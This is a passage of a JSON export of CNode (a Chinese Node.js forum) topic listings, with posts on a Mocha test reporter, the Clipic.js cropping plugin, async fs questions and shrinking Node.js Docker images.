10s 左右\n        res.end(&#x27;a is &#x27; + new Date())\n    } else if (req.url === &#x27;&#x2F;b&#x27;) {\n        res.end(&#x27;b is &#x27; + new Date())\n    }\n})\n\napp.listen(3600, function () {\n    console.log(&#x27;服务已启动&#x27;)\n})\n</code></pre></div>","title":"关于 Nodejs 服务器高并发的疑问","last_reply_at":"2019-04-14T06:29:15.453Z","good":false,"top":false,"reply_count":62,"visit_count":3238,"create_at":"2019-03-15T02:13:30.302Z","author":{"loginname":"dkvirus","avatar_url":"https://avatars1.githubusercontent.com/u/29170168?v=4&s=120"}},{"id":"5cb037cbdad66d658e40851b","author_id":"55500f555809a4b66f37f625","tab":"share","content":"<div class=\"markdown-text\"><h2>引言</h2>\n<p>在编程测试用例的过程中，一款好的测试报告器能帮忙我们一览用例全貌，并且快速定位问题。目前市面上的报告器大多功能较为单一，随着对报告器的要求不断提升，现有测试报告器已经无法满足飞速发展的业务。本文从如何获取 Mocha 数据到渲染 HTML 报告器，分享如何开发一款测试报告器，最后介绍一款蚂蚁国际出品的测试报告器 <a href=\"https://macacajs.github.io/macaca-reporter/zh/\">Macaca Reporter</a>。</p>\n<h2>获取 Mocha 数据</h2>\n<h3>处理数据</h3>\n<p>通过监听 Mocha 用例处理事件，对 Mocha 的数据进行二次加工，可以获取我们需要的数据结构。具体代码见 <a href=\"https://github.com/macacajs/macaca-reporter/blob/master/lib/macaca-reporter.js#L51\">GitHub</a>。</p>\n<pre class=\"prettyprint language-javascript\"><code>function MacacaReporter(runner, options) {\n\n  &#x2F;&#x2F; 用例结束的钩子函数，对数据 output 进行处理\n  this.done = (failures, exit) =&gt; done(this.output, options, this.config, failures, exit);\n\n  this.config = {\n    reportFilename: &#x27;report&#x27;,\n    saveJson: true\n  };\n  Base.call(this, runner);\n\n  new Spec(runner);\n\n  &#x2F;&#x2F; 测试用例开始执行的时候，获取 Mocha 数据的引用\n  runner.on(&#x27;start&#x27;, () =&gt; {\n    this._originSuiteData = runner.suite;\n  });\n\n  &#x2F;&#x2F; 每次用例结束后，对 Mocha 数据进行处理\n  runner.on(&#x27;test end&#x27;, test =&gt; {\n    test.uuid = _.uuid();\n    handleTestEnd();\n  });\n\n  &#x2F;&#x2F; 所有用例结束后，打印数据，输出报告器\n  runner.on(&#x27;end&#x27;, test =&gt; {\n    handleTestEnd(true);\n  });\n}\n</code></pre><p>数据处理过程中需要注意对 circle json 的处理，Mocha 数据中每个 test 会引用 suit，导致普通 JSON.stringify 处理会抛异常，这里采用 <a href=\"https://github.com/debitoor/safe-json-stringify\">safe-json-stringify</a> 对其进行处理。</p>\n<p>在数据处理数据后，得到 Mocha 测试数据</p>\n<ul>\n<li>JSON 文件保存到本地一份，以供其他测试框架集成使用。</li>\n<li>同时通过转码后内嵌到 html 报告器中，作为 html 报告器的原始数据：见 <a href=\"https://github.com/macacajs/macaca-reporter/blob/master/lib/render.js\">GitHub</a></li>\n</ul>\n<h3>用例截图</h3>\n<p>用例截图使用 macaca 框架提供的能力，基于 electron 的截图功能，能够在用例结束前自动产生截图</p>\n<pre class=\"prettyprint language-javascript\"><code>&#x2F;&#x2F; https:&#x2F;&#x2F;github.com&#x2F;macacajs&#x2F;macaca-wd&#x2F;blob&#x2F;master&#x2F;lib&#x2F;helper.js#L183 \nwd.addPromiseChainMethod(&#x27;saveScreenshots&#x27;, function(context) {\n  const reportspath = path.join(cwd, &#x27;reports&#x27;);\n  const filepath = path.join(reportspath, &#x27;screenshots&#x27;, &#96;${uuid()}.png&#96;);\n  mkdir(path.dirname(filepath));\n\n  return this.saveScreenshot(filepath).then(() =&gt; {\n    appendToContext(context, &#96;${path.relative(reportspath, filepath)}&#96;);\n  });\n});\n</code></pre><p>生成截图后，可以将图片上传到 CDN 中，将路径保存到每个 test 数据中。</p>\n<pre class=\"prettyprint language-javascript\"><code>&#x2F;&#x2F; https:&#x2F;&#x2F;github.com&#x2F;macacajs&#x2F;macaca-reporter&#x2F;blob&#x2F;master&#x2F;lib&#x2F;macaca-reporter.js#L130\nMacacaReporter.appendToContext = function (mocha, content) {\n  try {\n    const test = mocha.currentTest || mocha.test;\n\n    if (!test.context) {\n      test.context = content;\n    } else if (Array.isArray(test.context)) {\n      test.context.push(content);\n    } else {\n      test.context = [test.context];\n      test.context.push(content);\n    }\n  } catch (e) {\n    console.log(&#x27;error&#x27;, e);\n  }\n};\n</code></pre><h2>开发 HTML 报告器</h2>\n<p>有了测试原始数据后，我们开始着手开发 HTML 报告器，报告器应该有以下两个要素：</p>\n<ul>\n<li>直观显示用例总数、成功和失败用例数量、耗时</li>\n<li>显示每个用例的具体名称、状态、耗时</li>\n</ul>\n<p>在此基础上，为了方便开发者直观的看到每个用例的情况以及用例的整体情况，我们添加了链路树模式、脑图模式和全图模式。</p>\n<h3>链路树模式</h3>\n<p>Mocha 测试用例编写是 suit 中嵌套 suit，叶子节点是 test（describle -&gt; describle -&gt; it），非常适合用链路图的形式开表达用例的关系。我们基于 <a href=\"https://d3js.org/\">D3</a> 开发了 <a href=\"https://github.com/zhuyali/d3-tree\">d3-tree</a>，用来展示链路树结构。链路树模式是最常用的也是默认的展示模式，将用例的组织结构按照树来展示，链路树模式方便还原业务产品的测试执行路径。</p>\n<pre class=\"prettyprint language-javascript\"><code>&#x2F;&#x2F; https:&#x2F;&#x2F;github.com&#x2F;macacajs&#x2F;macaca-reporter&#x2F;blob&#x2F;master&#x2F;assets&#x2F;components&#x2F;Suite.js#L107\nconst d3tree = new D3Tree({\n  selector: selector,\n  data: d3Data,\n  width: document.querySelector(&#x27;ul.head&#x27;).clientWidth,\n  height: this.maxD3Height * 300,\n  duration: 500,\n  imageHeight: 200,\n  imageWidth: 200,\n  imageMargin: 10,\n  itemConfigHandle: () =&gt; {\n    return {\n      isVertical: false\n    };\n  }\n});\nd3tree.init();\n</code></pre><p>传入对应数据结构就能绘制出下图：&lt;br /&gt;<img src=\"https://cdn.nlark.com/yuque/0/2019/png/95383/1555052751748-44a6c5df-8d70-49d8-96f9-115b5914711c.png#align=left&amp;display=inline&amp;height=847&amp;originHeight=1692&amp;originWidth=1491&amp;size=0&amp;status=done&amp;width=746\" alt></p>\n<h3>脑图模式</h3>\n<p>通过使用 [<a href=\"/user/antv\">@antv</a>/g6-editor](<a href=\"https://github.com/antvis/g6-editor\">https://github.com/antvis/g6-editor</a>) 提供的 Mind 可以非常方便的绘制脑图。脑图模式可以认为是全部用例的概览，这个视图更方便用户整理和组织用例，在改进、补充新用例前可作为分析依据。</p>\n<pre class=\"prettyprint language-javascript\"><code>&#x2F;&#x2F; https:&#x2F;&#x2F;github.com&#x2F;macacajs&#x2F;macaca-reporter&#x2F;blob&#x2F;master&#x2F;assets&#x2F;components&#x2F;Mind.js#L77\nnew Editor.Mind({\n  defaultData: mindSuite,\n  labelEditable: false,\n  mode: &#x27;readOnly&#x27;,\n  graph: {\n    container: &#x27;mind-node&#x27;,\n    height: window.innerHeight - 100,\n    width: window.innerWidth,\n  },\n});\n</code></pre><p><img src=\"https://cdn.nlark.com/yuque/0/2019/png/95383/1555052751763-a97602e7-df8e-44df-b187-074586c6a8b5.png#align=left&amp;display=inline&amp;height=296&amp;originHeight=624&amp;originWidth=1570&amp;size=0&amp;status=done&amp;width=746\" alt></p>\n<h3>全图模式</h3>\n<p>全图模式提取了测试过程中的全部截图，更适用于偏渲染展示型的功能测试。在交付下一阶段前可以用做质量依据从而降低成本。但不建议每次通过人工看报告的形式来避免问题，推荐使用 <a href=\"https://macacajs.github.io/zh/guide/computer-vision.html#%E5%85%B6%E5%AE%83%E6%96%B9%E6%A1%88\">像素判断</a> 和异常捕获等自动化手段辅助断言当前渲染是否正常。&lt;br /&gt;<img src=\"https://cdn.nlark.com/yuque/0/2019/png/95383/1555052751810-a1405baa-21f1-4185-9594-f095747e3b16.png#align=left&amp;display=inline&amp;height=296&amp;originHeight=525&amp;originWidth=1322&amp;size=0&amp;status=done&amp;width=746\" alt></p>\n<h2>Macaca Reporter</h2>\n<p>蚂蚁国际的前端同学在业务实践过程中，基于 <a href=\"https://mochajs.org/\">Mocha</a> 沉淀了 <a href=\"https://macacajs.github.io/macaca-reporter/zh/guide/\">macaca-reporter</a>，经过近两年的不断打磨，已经在阿里多个 BU 中广泛使用。我们先看看 Macaca Reporter 具有哪些能力，能够做哪些事情：</p>\n<ul>\n<li>配合自动截图功能能够刻画完整的链路</li>\n<li>能够支持成功、失败、跳过等类型的用例展示</li>\n<li>支持计算通过率</li>\n<li>支持脑图模型展示用例链路</li>\n<li>支持图片模式直观展示用例截图</li>\n<li>支持二次定制开发，添加功能</li>\n</ul>\n<h3>深度刻画链路</h3>\n<p>效果图（页面太长，只截取了一小部分）：</p>\n<p><img src=\"https://cdn.nlark.com/yuque/0/2019/png/95383/1555052751778-2226a04e-7a66-42a1-83ef-e679d5003c06.png#align=left&amp;display=inline&amp;height=1238&amp;originHeight=2672&amp;originWidth=1610&amp;size=0&amp;status=done&amp;width=746\" alt></p>\n<h3>脑图模式</h3>\n<p><img src=\"https://cdn.nlark.com/yuque/0/2019/png/95383/1555052751775-8248002e-e9e7-48e9-b373-7970e0a4c4cd.png#align=left&amp;display=inline&amp;height=399&amp;originHeight=849&amp;originWidth=1588&amp;size=0&amp;status=done&amp;width=746\" alt></p>\n<h3>图片模式</h3>\n<p><img src=\"https://cdn.nlark.com/yuque/0/2019/png/95383/1555052751789-95b11d04-acf1-49bd-bb85-1ee40729e6c0.png#align=left&amp;display=inline&amp;height=532&amp;originHeight=1148&amp;originWidth=1610&amp;size=0&amp;status=done&amp;width=746\" alt></p>\n<h3>表格模式</h3>\n<p><img src=\"https://cdn.nlark.com/yuque/0/2019/png/95383/1555052751819-ac782c60-8627-4530-bcdc-75a7230972fe.png#align=left&amp;display=inline&amp;height=655&amp;originHeight=1482&amp;originWidth=1689&amp;size=0&amp;status=done&amp;width=746\" alt></p>\n<h2>体验 Macaca Reporter</h2>\n<p>通过 DataHub 项目体验下 Macaca Repoter：</p>\n<pre class=\"prettyprint language-bash\"><code>$ git clone git@github.com:macacajs&#x2F;macaca-datahub.git\n$ cd macaca-datahub\n$ npm i\n$ npm run dev:test\n$ npm run test\n</code></pre><p>等测试用例跑完之后，控制台会输出：</p>\n<pre class=\"prettyprint\"><code>&gt;&gt; &gt;&gt; html reporter generated: &#x2F;github&#x2F;macacajs&#x2F;datahub-view&#x2F;reports&#x2F;index.html\n&gt;&gt; &gt;&gt; json reporter generated: &#x2F;github&#x2F;macacajs&#x2F;datahub-view&#x2F;reports&#x2F;json-final.json\n&gt;&gt; &gt;&gt; reporter config generated:&#x2F;github&#x2F;macacajs&#x2F;datahub-view&#x2F;reports&#x2F;config.json\n&gt;&gt; &gt;&gt; coverage reporter generated: &#x2F;github&#x2F;macacajs&#x2F;datahub-view&#x2F;coverage&#x2F;index.html\n</code></pre><p>打开 HTML 报告器即可。</p>\n<h2>结语</h2>\n<p>Macaca Reporter 作为一款功能强大的报告器，欢迎大家来使用，来共建。</p>\n<p>项目主页：<a href=\"https://macacajs.github.io/macaca-reporter/zh/\">https://macacajs.github.io/macaca-reporter/zh/</a>&lt;br /&gt;GitHub：<a href=\"https://github.com/macacajs/macaca-reporter\">https://github.com/macacajs/macaca-reporter</a>&lt;br /&gt;问题反馈：<a href=\"https://github.com/macacajs/macaca-reporter/issues\">https://github.com/macacajs/macaca-reporter/issues</a></p>\n<p>BTW，欢迎成为 <a href=\"https://macacajs.com/\">Macaca</a> 项目的<a href=\"https://macacajs.github.io/zh/guide/contributing.html#%E5%89%8D%E8%A8%80\">贡献者</a>，Macaca 是一套面向用户端软件的测试解决方案，提供了自动化驱动，环境配套，周边工具，集成方案等，拥有自研的自主产权的产品矩阵，旨在解决终端上的测试、自动化、性能等方面的问题。</p>\n</div>","title":"如何打造东半球 No1 的测试报告器","last_reply_at":"2019-04-13T11:00:41.428Z","good":false,"top":false,"reply_count":7,"visit_count":544,"create_at":"2019-04-12T07:01:31.872Z","author":{"loginname":"yllziv","avatar_url":"https://avatars1.githubusercontent.com/u/11460601?v=4&s=120"}},{"id":"57a944e59c26ea7c7226096f","author_id":"559f6bb9419f1e8a23a64163","tab":"ask","content":"<div class=\"markdown-text\"><p>希望大家发我一份，谢谢</p>\n</div>","title":"redis desk manager  收费了，还有免费的工具吗？","last_reply_at":"2019-04-13T09:39:23.522Z","good":false,"top":false,"reply_count":10,"visit_count":5397,"create_at":"2016-08-09T02:50:13.408Z","author":{"loginname":"qimuyunduan","avatar_url":"https://avatars0.githubusercontent.com/u/3916574?v=3&s=120"}},{"id":"5ca73b1431010b2dfbb43766","author_id":"590a8584bbaf2f3f569be508","tab":"ask","content":"<div class=\"markdown-text\"><p>最近公司要做一个智能化产品，用到的富文本编辑器有些特殊要求，需要比较智能，大概样子要像下面这样\n<img src=\"//static.cnodejs.org/FqSMkSFYQ8cdIDTV9W7Pdu7aSHbk\" alt=\"image.png\"></p>\n<ol>\n<li>要支持一些敏感词的标注</li>\n<li>我们可能会对敏感词做一些替换</li>\n<li>要支持拖拽上传图片和视频，点击图片的时候要在图片周围显示出像上图那个的提示，支持裁剪之类的操作。。。</li>\n</ol>\n<p>大家有没有好的开源框架推荐，最好在原基础上改动比较小的 。</p>\n</div>","title":"大家有没有好的富文本编辑器推荐?","last_reply_at":"2019-04-13T09:17:31.690Z","good":false,"top":false,"reply_count":6,"visit_count":1035,"create_at":"2019-04-05T11:25:08.395Z","author":{"loginname":"GeekHi","avatar_url":"https://avatars2.githubusercontent.com/u/22934185?v=4&s=120"}},{"id":"5c3092dc5bf06c5e7e3f1ab4","author_id":"5c2ec7f75bf06c5e7e3f10e8","tab":"share","content":"<div class=\"markdown-text\"><p>《web前端开发》从零基础到高级项目实战14个视频教程，2018整理较新web前端开发教程，还有移动端视频教程，整套教程包含笔记+开发工具+源码</p>\n<p><img src=\"//static.cnodejs.org/Fr7UbcXv9dgB-tK3c4LNqhteSp9B\" alt=\"11111.jpg\"></p>\n<p><strong>web前端开发教程大纲</strong>\n<img src=\"//static.cnodejs.org/FukwYmgiH_AjeDVsmVjds7kboIOB\" alt=\"22222.jpg\"></p>\n<p><strong>14个前端项目实战教程</strong>\n<img src=\"//static.cnodejs.org/FiLUGF9w51avsIlCqxQcZi-IRPZE\" alt=\"33333.jpg\"></p>\n<p>教程下载：<a href=\"https://www.sucaihuo.com/video/448.html\">https://www.sucaihuo.com/video/448.html</a></p>\n</div>","title":"《web前端开发》从零基础到高级项目实战14个视频教程","last_reply_at":"2019-04-13T08:59:53.618Z","good":false,"top":false,"reply_count":5,"visit_count":1847,"create_at":"2019-01-05T11:19:56.250Z","author":{"loginname":"missheying","avatar_url":"https://avatars3.githubusercontent.com/u/46346806?v=4&s=120"}},{"id":"5ca42ada31010b2dfbb42a0b","author_id":"5c0e2cc3f3d48d2397c0fad9","tab":"share","content":"<div class=\"markdown-text\"><h1>Clipic.js</h1>\n<blockquote>\n<p>Clipic.js插件可以为移动端提供头像上传并裁剪成指定尺寸，用原生js开发的，轻量级，包含html跟css，不到8kb。先上一张效果图，或者点此链接体验：<a href=\"https://teojs.github.io/clipic/\" title=\"Clipic.js\">https://teojs.github.io/clipic/</a></p>\n</blockquote>\n<p><img src=\"https://user-gold-cdn.xitu.io/2019/3/6/16951ba160c5fc6d?w=300&amp;h=519&amp;f=gif&amp;s=1635316\" alt=\"eg\"></p>\n<h2>Github地址</h2>\n<p><a href=\"https://github.com/teojs/clipic\">https://github.com/teojs/clipic</a></p>\n<h2>使用方法</h2>\n<h3>支持 npm 方式</h3>\n<pre class=\"prettyprint language-bath\"><code>$ npm install clipic\n</code></pre><h3>支持 cdn 引入</h3>\n<pre class=\"prettyprint language-html\"><code>&lt;script src=&quot;https:&#x2F;&#x2F;unpkg.com&#x2F;clipic&#x2F;dist&#x2F;clipic.min.js&quot;&gt;&lt;&#x2F;script&gt;\n</code></pre><h3>在 vue 项目中使用</h3>\n<pre class=\"prettyprint language-html\"><code>&#x2F;&#x2F; xxx.vue\n&lt;template&gt;\n  &lt;img :src=&quot;base64&quot; &#x2F;&gt;\n  &lt;input type=&quot;file&quot; name=&quot;file&quot; accept=&quot;image&#x2F;*&quot; @change=&quot;uploadImg&quot; &#x2F;&gt;\n&lt;&#x2F;template&gt;\n&lt;script&gt;\n  import Clipic from &#x27;clipic&#x27;\n  const clipic = new Clipic()\n  export default {\n    data () {\n      return {\n        base64: &#x27;&#x27;\n      }\n    }\n    methods: {\n      uploadImg(event) {\n        const files = event.files\n        const reader = new FileReader()\n        reader.readAsDataURL(files[0])\n        reader.onload = img =&gt; {\n          clipic.getImage({\n            width: 500,\n            height: 400,\n            src: img.target.result,\n            onDone: base64 =&gt; {\n              this.base64 = base64\n            }\n          })\n        }\n        event.value = &#x27;&#x27;\n      }\n    }\n  }\n&lt;&#x2F;script&gt;\n</code></pre><p>普通项目的使用可以看作者的<a href=\"https://github.com/teojs/clipic/blob/master/index.html\">demo</a></p>\n<h2>参数说明</h2>\n<ul>\n<li><code>width:Number</code> (默认：500) – 裁剪宽度</li>\n<li><code>height:Number</code> (默认：500) – 裁剪高度</li>\n<li><code>ratio:Number</code> (可选) – 裁剪的比例，当传入<code>ratio</code>时<code>width/height</code>将无效</li>\n<li><code>src:String</code> (必传) – 需要裁剪的图片，可以是图片链接，或者 base64</li>\n<li><code>type:String</code> (默认：jpeg) – 裁剪后图片的类型，仅支持 jpeg/png 两种</li>\n<li><code>quality:Number</code> (默认：0.9) – 压缩质量</li>\n<li><code>buttonText:Array</code> (默认：[‘取消’, ‘重置’, ‘完成’]) – 底部三个按钮文本</li>\n</ul>\n</div>","title":"移动端上传头像并裁剪 - Clipic.js","last_reply_at":"2019-04-13T05:46:49.974Z","good":false,"top":false,"reply_count":4,"visit_count":819,"create_at":"2019-04-03T03:39:06.951Z","author":{"loginname":"Cheesenx","avatar_url":"https://avatars2.githubusercontent.com/u/25993112?v=4&s=120"}},{"id":"570c6a09d3220b7e4e3045f2","author_id":"53f8a710bbdaa79d51633ca0","tab":"share","content":"<div class=\"markdown-text\"><p><strong>1、前端那些事儿</strong>\n<img src=\"http://dn-cnode.qbox.me/FvIdtHgmmjHFjXrKJ9p8el-h_25f\" alt=\"前端那些事儿258.jpg\"></p>\n<p><strong>2、前端JavaScript</strong>\n<img src=\"http://dn-cnode.qbox.me/FjGYVHXFiSC60kQooF51fkdspRfk\" alt=\"前端javascript.png\"></p>\n<p><strong>3、前端乱炖</strong>\n<img src=\"//static.cnodejs.org/Frn63TgZ2YBHrB52ZPxAQyaQP522\" alt=\"前端乱炖.png\"></p>\n<p><strong>4、前端外刊评论</strong>\n<img src=\"http://dn-cnode.qbox.me/FuwHuBI0oBqhPQ1-EIsypaGICo1P\" alt=\"前端外刊评论.png\"></p>\n<p><strong>5、前端大全</strong>\n<img src=\"http://dn-cnode.qbox.me/FmDFNI8z9v3MM4iS9g6oHM2se_2C\" alt=\"前端大全.png\"></p>\n<p><strong>6、Node全栈</strong>\n<img src=\"http://dn-cnode.qbox.me/FtZX7S1kNBfGGlXWBmHs1Bie88KV\" alt=\"Node全栈.png\"></p>\n<p><strong>7、 W3cplus</strong>\n<img src=\"http://dn-cnode.qbox.me/FgDOdj_xq0rjWCUeq1DoWBu2sASY\" alt=\"W3cplus.png\"></p>\n<p><strong>8、前端早读课</strong>\n<img src=\"http://dn-cnode.qbox.me/FvaTw6AHPmZQfaV7FeCsqe9Ft75a\" alt=\"前端早读课.png\"></p>\n<p><strong>9、HTML5</strong>\n<img src=\"http://dn-cnode.qbox.me/FhnDEmZ7QiFcthZLBVyftyqQ-41m\" alt=\"HTML5.png\"></p>\n<p><strong>10、web前端开发</strong>\n<img src=\"http://dn-cnode.qbox.me/FrtGaDe20fGLikIoj6vOr-8KaafI\" alt=\"web前端开发.png\"></p>\n<p><strong>11、奇舞周刊</strong>\n<img src=\"//static.cnodejs.org/FvW-gDSvqqtgG-5k2BdKrxsRRdcK\" alt=\"奇舞周刊.png\"></p>\n<p><strong>12、滴滴出行</strong>\n<img src=\"//static.cnodejs.org/FvxDk-imDhANm2qUyBnWQEogw-2U\" alt=\"滴滴出行.png\"></p>\n<p><strong>欢迎补充</strong>：\n…</p>\n</div>","title":"前端微信公众号推荐","last_reply_at":"2019-04-13T05:00:04.908Z","good":false,"top":false,"reply_count":17,"visit_count":6430,"create_at":"2016-04-12T03:22:49.253Z","author":{"loginname":"JerroldLee","avatar_url":"https://avatars.githubusercontent.com/u/5645510?v=3&s=120"}},{"id":"5cac05e9d68ff5064921b50c","author_id":"5c1af54c3898674067a76341","tab":"ask","content":"<div class=\"markdown-text\"><p>技术大咖们来评估一下难度系数怎么样啊\n<a href=\"https://activity.lagou.com/topic/0408AfterShiptopic.html\">https://activity.lagou.com/topic/0408AfterShiptopic.html</a></p>\n<p>这个公司还有一个代码版本的公司介绍，用开源做的，一起发出来看看\n<a href=\"https://activity.lagou.com/gracie/pc/AfterShip0213.html\">https://activity.lagou.com/gracie/pc/AfterShip0213.html</a></p>\n</div>","title":"大家有用 hackerrank 刷过题吗，这家公司出了一个题来让大家测测自己有多牛","last_reply_at":"2019-04-13T02:52:01.967Z","good":false,"top":false,"reply_count":3,"visit_count":808,"create_at":"2019-04-09T02:39:37.465Z","author":{"loginname":"littleflowersansan","avatar_url":"https://avatars3.githubusercontent.com/u/42596541?v=4&s=120"}},{"id":"5cb149d8dad66d658e408806","author_id":"5adf4d96d25ba6000932f5e2","tab":"ask","content":"<div class=\"markdown-text\"><p>在UDP中setMulticastTTL和seTTL有什么区别？作用是什么？看文档中的说明都是一样的，有点懵，有没有牛人举例说明一下呀。</p>\n</div>","title":"UDP中setMulticastTTL和seTTL的区别作用？","last_reply_at":"2019-04-13T02:30:48.691Z","good":false,"top":false,"reply_count":0,"visit_count":292,"create_at":"2019-04-13T02:30:48.691Z","author":{"loginname":"wangliguo6666","avatar_url":"https://avatars0.githubusercontent.com/u/18714910?v=4&s=120"}},{"id":"5caebc13207b2365936ebda4","author_id":"5909444b782dbc4b183ecfe2","tab":"share","content":"<div class=\"markdown-text\"><p><img src=\"https://i04picsos.sogoucdn.com/ff46168e7f4e45b2\" alt></p>\n</div>","title":"有没有 vscode 扩展的群，一起撸扩展？","last_reply_at":"2019-04-12T08:11:31.826Z","good":false,"top":false,"reply_count":11,"visit_count":986,"create_at":"2019-04-11T04:01:23.241Z","author":{"loginname":"axetroy","avatar_url":"https://avatars2.githubusercontent.com/u/9758711?v=4&s=120"}},{"id":"5cb00e31dad66d658e40842b","author_id":"5cb00b86dad66d658e40840d","tab":"ask","content":"<div class=\"markdown-text\"><p>先贴出让我困惑的结果：\n<img src=\"//static.cnodejs.org/FmtssEdijYIEgtbShFzFgohcC3sF\" alt=\"图片\"></p>\n<p>代码：</p>\n<pre class=\"prettyprint language-js\"><code>var fs = require(&#x27;fs&#x27;)\nfs.readdir(&#x27;node_modules&#x27;,function(err,files){\n\tif(err){\n\t\tconsole.log(err)\n\t}else{\n\t\t&#x2F;&#x2F;console.log(files)\n\t\tlet filesArr=[];\n\t\tfor(var i=0;i&lt;files.length;i++){\n\t\t\t(function(i){\n\t\t\t\tfs.stat(&#x27;node_modules&#x2F;&#x27;+files[i],(e,stats)=&gt;{\n\t\t\t\t&#x2F;&#x2F;\tconsole.log(&#x27;files[&#x27;+i+&#x27;] : &#x27;+files[i])\n\t\t\t\t\tif(stats.isDirectory()){\n\t\t\t\t\t\tfilesArr.push(files[i])\n\t\t\t\t\t\tif(i === files.length-1){\n\t\t\t\t\t\t\tconsole.log(&#x27;目录：-----&#x27;+filesArr)\n\t\t\t\t\t\t}\n\t\t\t\t\t}\n\n\t\t\t\t\tconsole.log(&#x27;files[&#x27;+i+&#x27;] : &#x27;+files[i])   \n\t\t\t\t})\n\t\t\t})(i)\n\t\t}\n\t\t\n\t}\n})\n</code></pre><p>上述示例中有时得到的<code>filesArr</code>仅有<code>nav</code>目录，有时候得到的结果是<code>nav</code>和<code>bar</code>目录都有，为什么呢？我以为异步函数是按照顺序依次加入到队列中的，然后依次执行，不是这样的吗？</p>\n</div>","title":"新手求教，使用fs.stat判断fs.readdir读出的数组中是否含有目录时得到的结果与期望有异","last_reply_at":"2019-04-12T05:46:35.636Z","good":false,"top":false,"reply_count":3,"visit_count":440,"create_at":"2019-04-12T04:04:01.903Z","author":{"loginname":"innerWang","avatar_url":"https://avatars1.githubusercontent.com/u/44764435?v=4&s=120"}},{"id":"5cada94fdad66d658e40782c","author_id":"5c98426500bcfd7eb2be5add","tab":"share","content":"<div class=\"markdown-text\"><h1>Node.js docker 镜像体积优化实践</h1>\n<p>你讨厌部署你的应用程序花费很长时间吗? 对于单个容器来说，超过gb并不是最佳实践。每次部署新版本时都要处理数十亿字节，这对我们来说并不太合适。</p>\n<p>本文将通过Nodejs程序展示如何优化Docker镜像的几个简单步骤，使它们更小、更快、更适合生产环境。</p>\n<h2>简单的一段Node.js项目</h2>\n<p>首先写一段基于express的简单web服务器程序</p>\n<pre class=\"prettyprint language-js\"><code>&#x2F;&#x2F; package.json\n{\n  &quot;name&quot;: &quot;docker-test&quot;,\n  &quot;version&quot;: &quot;1.0.0&quot;,\n  &quot;description&quot;: &quot;&quot;,\n  &quot;main&quot;: &quot;app.js&quot;,\n  &quot;scripts&quot;: {\n    &quot;start&quot;: &quot;node app&quot;\n  },\n  &quot;author&quot;: &quot;&quot;,\n  &quot;license&quot;: &quot;ISC&quot;,\n  &quot;dependencies&quot;: {\n    &quot;express&quot;: &quot;^4.16.4&quot;\n  },\n  &quot;devDependencies&quot;: {\n    &quot;eslint&quot;: &quot;^5.16.0&quot;\n  }\n}\n</code></pre><pre class=\"prettyprint language-js\"><code>&#x2F;&#x2F; app.js\nconst express = require(&#x27;express&#x27;)\nconst app = express()\n\napp.get(&#x27;&#x2F;&#x27;, function(req, res){\n  res.send(&#x27;hello world&#x27;)\n})\n\napp.listen(3000)\n</code></pre><p>在根目录下新建Dockerfile并写入以下代码</p>\n<pre class=\"prettyprint language-dockerfile\"><code># Dockerfile\nFROM node\n\nCOPY . &#x2F;home&#x2F;app\n\nRUN cd &#x2F;home&#x2F;app &amp;&amp; npm install\n\nWORKDIR &#x2F;home&#x2F;app\n\nCMD [&#x27;npm&#x27;, &#x27;start&#x27;]\n</code></pre><p>执行</p>\n<ul>\n<li>docker build -t myapp .</li>\n<li>docker images</li>\n</ul>\n<p><img src=\"https://i.loli.net/2019/04/10/5cad83236b780.jpeg\" alt=\"结果\"></p>\n<p>可以看到这段最简单的nodejs程序有920MB,请不要这样做。接下来我们将逐步的减少这个镜像的体积。</p>\n<h2>优化docker生产环境镜像</h2>\n<ul>\n<li>\n<h3>使用Node.js Alpine 镜像</h3>\n<p>大幅减小镜像体积的最简单和最快的方法是选择一个小得多的基本镜像。Alpine是一个很小的Linux发行版，可以完成这项工作。只要选择Node.js的Alpine版本，就会有很大的改进。</p>\n<pre class=\"prettyprint language-dockerfile\"><code>FROM node:alpine\n\nCOPY . &#x2F;home&#x2F;app\n\nRUN cd &#x2F;home&#x2F;app &amp;&amp; npm install\n\nWORKDIR &#x2F;home&#x2F;app\n\nCMD [&#x27;npm&#x27;, &#x27;start&#x27;]\n</code></pre><p>build之后\n<img src=\"https://i.loli.net/2019/04/10/5cad83877388e.jpeg\" alt=\"结果\"></p>\n<p>可以看到整整减少了<strong>800MB</strong>，这是一个非常大的优化。</p>\n</li>\n<li>\n<h3>生成环境下不打包开发的依赖包</h3>\n<p>但我们还能继续优化。我们正在安装所有依赖项，即使我们最终只需要生成环境下的依赖包。如果只打包生产环境的以来不会怎么样，继续改进一下。</p>\n<pre class=\"prettyprint language-dockerfile\"><code>  FROM node:alpine\n\n  COPY . &#x2F;home&#x2F;app\n\n  RUN cd &#x2F;home&#x2F;app &amp;&amp; npm install --production\n\n  WORKDIR &#x2F;home&#x2F;app\n\n  CMD [&#x27;npm&#x27;, &#x27;start&#x27;]\n</code></pre><p>build之后\n<img src=\"https://i.loli.net/2019/04/10/5cad8e5f54128.jpeg\" alt=\"结果\"></p>\n<p>我们又减少了6MB，因为我们目前只有一个开发依赖，可以想象在一个正常的项目中这也将是非常大的优化。</p>\n</li>\n<li>\n<h3>使用基础版本的 Alpine 镜像组合Nodejs</h3>\n<p>如果我们使用基础版本的 Alpine 镜像，然后自己安装Nodejs结果会怎么样呢?</p>\n<pre class=\"prettyprint language-dockerfile\"><code>  FROM alpine:latest\n\n  RUN apk add --no-cache --update nodejs nodejs-npm\n\n  COPY . &#x2F;home&#x2F;app\n\n  RUN cd &#x2F;home&#x2F;app &amp;&amp; npm install --production\n\n  WORKDIR &#x2F;home&#x2F;app\n\n  CMD [&#x27;npm&#x27;, &#x27;start&#x27;]\n</code></pre><p>build之后\n<img src=\"https://i.loli.net/2019/04/10/5cad93eceb10b.jpeg\" 